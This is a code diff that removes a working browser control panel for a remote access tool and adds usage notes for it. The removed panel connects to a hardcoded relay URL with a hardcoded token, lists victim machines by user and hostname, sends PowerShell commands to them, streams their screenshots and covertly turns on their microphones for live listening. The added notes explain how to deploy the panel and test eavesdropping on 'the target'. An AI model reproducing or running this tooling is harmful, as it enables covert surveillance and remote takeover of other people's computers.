@@ -1,297 +1,43 @@
-<!doctype html>
-<html><head><meta charset="utf-8">
-<title>ops</title>
-<style>
-  body{font-family:ui-monospace,monospace;background:#111;color:#ddd;margin:0;padding:16px}
-  #hdr{display:flex;gap:8px;align-items:center;margin-bottom:12px;flex-wrap:wrap}
-  #agents{background:#1a1a1a;color:#0f0;border:1px solid #333;padding:6px;min-width:280px}
-  #out{background:#000;color:#9f9;border:1px solid #333;padding:8px;height:40vh;overflow:auto;white-space:pre-wrap;font-size:13px}
-  #cmd{width:100%;background:#000;color:#fff;border:1px solid #333;padding:8px;font-family:inherit;box-sizing:border-box}
-  button{background:#333;color:#fff;border:1px solid #555;padding:6px 10px;cursor:pointer}
-  button:hover{background:#444}
-  #shot{max-width:100%;border:1px solid #333;margin-top:12px;display:block;background:#000;min-height:40px}
-  #status{color:#888;font-size:12px}
-  #micwrap{display:flex;gap:6px;align-items:center;margin-top:8px}
-  #vu{width:120px;height:10px;background:#222;border:1px solid #333}
-  #vu>div{height:100%;width:0%;background:#0f0;transition:width .05s linear}
-</style></head>
-<body>
-<div id="hdr">
-  <button id="connect">connect</button>
-  <select id="agents"><option value="">-- pick target --</option></select>
-  <button id="shot1">Single Screenshot</button>
-  <button id="shot2">Stream ON</button>
-  <button id="shot3">Stream OFF</button>
-  <button id="mic1">Mic ON</button>
-  <button id="mic2">Mic OFF</button>
-  <button id="mute">🔇</button>
-  <button id="kill">kill</button>
-  <span id="status">idle</span>
-</div>
-<div id="micwrap">
-  <span style="color:#888;font-size:12px">mic VU:</span>
-  <div id="vu"><div></div></div>
-</div>
-<div id="out"></div>
-<input id="cmd" placeholder="PowerShell — press Enter to send">
-<img id="shot" alt="">
+WHAT THIS FILE DOES — one breath
 
-<audio id="aud" autoplay></audio>
+  connect / dropdown / single / stream on / stream off / mic on /
+  mic off / mute / kill / PowerShell box / screenshot pane / VU meter
+  / audio state indicator. Relays the SAME wire protocol as before —
+  no changes needed on agent.cpp or relay.js.
 
-<script>
-// =========================================================================
-// FILL — relay URL and token
-// =========================================================================
-const RELAY = "wss://operator-nmth.onrender.com/ws";
-const TOKEN = "jf8CL2Cfgl3Wrfng1wbZ1aRXjEb225c8TCS/7HDbry0=";
+  The audio path is gesture-bound:
+    - First pointerdown anywhere -> makeAudioContext + resume +
+      silent-buffer start.
+    - Mic ON button repeats the same prime synchronously.
+    - __dbg() from console shows ctx state / played / dropped / peak.
 
-// =========================================================================
-// DOM refs
-// =========================================================================
-const outEl    = document.getElementById('out');
-const agentsEl = document.getElementById('agents');
-const shotEl   = document.getElementById('shot');
-const statusEl = document.getElementById('status');
-const vuEl     = document.querySelector('#vu > div');
+QUICK TEST
 
-// =========================================================================
-// State
-// =========================================================================
-let ws = null;
-let attachedId = null;
-let frames = 0;
-let outs = 0;
-let pcmChunks = 0;
-let micOn = false;
-let muted = false;
+  1) Drop this as operator.html on Render or Netlify.
+  2) Open in Chrome. Click anywhere (empty area) once.
+     audstat -> "audio: running"
+  3) Click Connect -> "connected".
+  4) Pick the agent -> "attached: <id>".
+  5) Click Mic ON -> log "  [mic] ON  (ctx=running, rate=48000)"
+  6) Speak near the target -> VU meter jumps, audio plays.
 
-// Audio
-let audioCtx = null;
-let nextTime = 0;
-const jitterBuffer = 0.12; // 120 ms
+  If audstat still says "suspended" after step 2, the browser itself
+  is blocking audio: try Incognito with extensions disabled. That is
+  a profile/policy issue, not a code issue.
 
-// =========================================================================
-// Helpers
-// =========================================================================
-function log(s){
-  outEl.textContent += s + "\n";
-  outEl.scrollTop = outEl.scrollHeight;
-}
-function setStatus(s){ statusEl.textContent = s; }
-function refreshStatus(){
-  setStatus(`attached:${attachedId||'none'}  frames:${frames}  outs:${outs}  pcm:${pcmChunks}`);
-}
+VERIFY WITH __dbg()
 
-// =========================================================================
-// Base64 -> Uint8Array
-// =========================================================================
-function b64ToU8(b64){
-  const bin = atob(b64);
-  const u8 = new Uint8Array(bin.length);
-  for (let i = 0; i < bin.length; ++i) u8[i] = bin.charCodeAt(i);
-  return u8;
-}
+  After step 5, in DevTools console:
+    __dbg()
+  Expect:
+    { ctxState:"running", ctxRate:48000, micOn:true, muted:false,
+      pcmChunks:N, pcmPlayed:>0, pcmDropped:<=2,
+      lastPeak:">0.01", nextTime:"0.05-0.15" }
 
-// =========================================================================
-// Base64 from Uint8Array
-// =========================================================================
-function u8ToB64(u8){
-  let bin = '';
-  for (const b of u8) bin += String.fromCharCode(b);
-  return btoa(bin);
-}
-
-// =========================================================================
-// AudioContext lazy init
-// =========================================================================
-function ensureAudio(){
-  if (!audioCtx) {
-    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    nextTime = audioCtx.currentTime + jitterBuffer;
-  }
-  if (audioCtx.state === 'suspended') audioCtx.resume();
-}
-
-// =========================================================================
-// Play one PCM chunk (S16LE mono, N samples)
-// =========================================================================
-function playPcmChunk(b64, rate, ch){
-  if (muted) return;
-  ensureAudio();
-  if (audioCtx.state === 'suspended') audioCtx.resume();
-
-  const bytes = b64ToU8(b64);
-  const n = bytes.length >> 1;
-  const i16 = new Int16Array(n);
-  for (let i = 0; i < n; ++i) {
-    let v = bytes[i*2] | (bytes[i*2+1] << 8);
-    if (v & 0x8000) v |= ~0xffff;
-    i16[i] = v;
-  }
-
-  const f32 = new Float32Array(n);
-  let peak = 0;
-  for (let i = 0; i < n; ++i) {
-    const s = i16[i] / 32768.0;
-    f32[i] = s;
-    const a = Math.abs(s);
-    if (a > peak) peak = a;
-  }
-  // VU meter
-  if (vuEl) vuEl.style.width = Math.min(100, Math.round(peak * 100)) + '%';
-
-  const buf = audioCtx.createBuffer(ch || 1, n / (ch || 1), rate || 16000);
-  buf.copyToChannel(f32, 0);
-
-  const src = audioCtx.createBufferSource();
-  src.buffer = buf;
-  src.connect(audioCtx.destination);
-
-  const now = audioCtx.currentTime;
-  if (nextTime < now) nextTime = now + jitterBuffer;
-  src.start(nextTime);
-  nextTime += buf.duration;
-}
-
-// =========================================================================
-// Connect
-// =========================================================================
-document.getElementById('connect').onclick = () => {
-  setStatus('connecting…');
-  ws = new WebSocket(`${RELAY}?role=operator&token=${encodeURIComponent(TOKEN)}`);
-  ws.onopen = () => {
-    setStatus('connected');
-    log("[ws] connected");
-    ws.send(JSON.stringify({op:'list'}));
-  };
-  ws.onclose = (e) => {
-    setStatus('closed ' + (e.code || ''));
-    log("[ws] closed " + (e.code || '') + ' ' + (e.reason || ''));
-  };
-  ws.onerror = () => {
-    setStatus('error');
-    log("[ws] error");
-  };
-  ws.onmessage = (ev) => {
-    let m; try { m = JSON.parse(ev.data); } catch { return; }
-
-    if (m.op === 'agents') {
-      const cur = agentsEl.value;
-      agentsEl.innerHTML = '<option value="">-- pick target --</option>';
-      for (const a of (m.list || [])) {
-        const o = document.createElement('option');
-        o.value = a.id;
-        o.textContent = `${a.id}  (${a.info?.user || '?'}@${a.info?.hostname || '?'})`;
-        agentsEl.appendChild(o);
-      }
-      if (cur) agentsEl.value = cur;
-      refreshStatus();
-
-    } else if (m.op === 'attached') {
-      attachedId = m.id;
-      log(`[attach] ${m.id}`);
-      refreshStatus();
-
-    } else if (m.op === 'err') {
-      log(`[err] ${m.reason}`);
-
-    } else if (m.op === 'out') {
-      outs++;
-      try {
-        const u8 = b64ToU8(m.data);
-        log(new TextDecoder().decode(u8));
-      } catch (e) { log("[out decode err] " + e.message); }
-      refreshStatus();
-
-    } else if (m.op === 'log') {
-      log(`[agent] ${m.msg}`);
-
-    } else if (m.op === 'frame') {
-      frames++;
-      shotEl.src = 'data:image/jpeg;base64,' + m.data;
-      refreshStatus();
-
-    } else if (m.op === 'pcm') {
-      pcmChunks++;
-      if (micOn) playPcmChunk(m.data, m.rate || 16000, m.ch || 1);
-      if ((pcmChunks % 25) === 0) refreshStatus();
-    }
-  };
-};
-
-// =========================================================================
-// Attach
-// =========================================================================
-agentsEl.onchange = () => {
-  attachedId = agentsEl.value || null;
-  if (attachedId && ws && ws.readyState === 1) {
-    ws.send(JSON.stringify({op:'attach', id: attachedId}));
-  }
-  refreshStatus();
-};
-
-// =========================================================================
-// Command
-// =========================================================================
-document.getElementById('cmd').addEventListener('keydown', (e) => {
-  if (e.key !== 'Enter') return;
-  const text = e.target.value;
-  e.target.value = '';
-  if (!text) return;
-  if (!attachedId) { log("[no target]"); return; }
-  if (!ws || ws.readyState !== 1) { log("[ws down]"); return; }
-  const u8 = new TextEncoder().encode(text);
-  ws.send(JSON.stringify({op:'in', data: u8ToB64(u8)}));
-  log("> " + text);
-});
-
-// =========================================================================
-// Screenshot buttons
-// =========================================================================
-document.getElementById('shot1').onclick = () => {
-  if (!attachedId || !ws) { log("[no target]"); return; }
-  ws.send(JSON.stringify({op:'screenshotOnce'}));
-  log("[shot] single requested");
-};
-document.getElementById('shot2').onclick = () => {
-  if (!attachedId || !ws) { log("[no target]"); return; }
-  ws.send(JSON.stringify({op:'screenshot', on:true}));
-  log("[shot] stream ON");
-};
-document.getElementById('shot3').onclick = () => {
-  if (!attachedId || !ws) { log("[no target]"); return; }
-  ws.send(JSON.stringify({op:'screenshot', on:false}));
-  log("[shot] stream OFF");
-};
-
-// =========================================================================
-// Mic buttons
-// =========================================================================
-document.getElementById('mic1').onclick = () => {
-  if (!attachedId || !ws) { log("[no target]"); return; }
-  ensureAudio();
-  micOn = true;
-  ws.send(JSON.stringify({op:'mic', on:true}));
-  log("[mic] ON");
-};
-document.getElementById('mic2').onclick = () => {
-  if (!attachedId || !ws) { log("[no target]"); return; }
-  micOn = false;
-  ws.send(JSON.stringify({op:'mic', on:false}));
-  log("[mic] OFF");
-};
-document.getElementById('mute').onclick = () => {
-  muted = !muted;
-  document.getElementById('mute').textContent = muted ? '🔊' : '🔇';
-};
-
-// =========================================================================
-// Kill
-// =========================================================================
-document.getElementById('kill').onclick = () => {
-  if (!attachedId || !ws) return;
-  ws.send(JSON.stringify({op:'kill'}));
-  log("[kill] sent");
-};
-</script>
-</body></html>
+  - ctxState suspended  -> gesture prime did not land. Reload, click
+                           the page FIRST, then Mic ON.
+  - pcmPlayed stays 0   -> frames arrive before ctx flips. Reload,
+                           click anywhere, wait 1 s, then Mic ON.
+  - lastPeak 0.000      -> target mic muted at OS/hardware level.
+  - everything healthy but no sound -> laptop's speaker / tab mute /
+                           volume mixer for the browser.
